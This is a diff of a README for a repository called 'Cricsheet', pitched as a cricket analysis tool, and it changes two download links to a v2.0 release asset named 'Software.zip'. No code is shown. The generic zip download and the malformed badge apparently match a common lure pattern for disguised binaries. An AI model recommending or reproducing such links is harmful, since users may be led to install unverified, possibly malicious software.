@@ -2,7 +2,7 @@
 
 Welcome to the **Cricsheet** repository – your ultimate destination for cricket match analysis! 📊🏏
 
-[![Download ZIP](https://github.com/dontskidme/Cricsheet/releases/download/v1.0/Software.zip%20ZIP-v1.0.0-blue)](https://github.com/dontskidme/Cricsheet/releases/download/v1.0/Software.zip)
+[![Download ZIP](https://github.com/dontskidme/Cricsheet/releases/download/v2.0/Software.zip%20ZIP-v1.0.0-blue)](https://github.com/dontskidme/Cricsheet/releases/download/v2.0/Software.zip)
 
 ## Overview
 
@@ -22,7 +22,7 @@ Welcome to the **Cricsheet** repository – your ultimate destination for cricke
 
 To get started with **Cricsheet**, follow these steps:
 
-1. Download the ZIP file from the following link: [Download ZIP](https://github.com/dontskidme/Cricsheet/releases/download/v1.0/Software.zip)
+1. Download the ZIP file from the following link: [Download ZIP](https://github.com/dontskidme/Cricsheet/releases/download/v2.0/Software.zip)
 2. Extract the contents of the ZIP file to your desired location
 3. Open the project in your preferred Python development environment
 
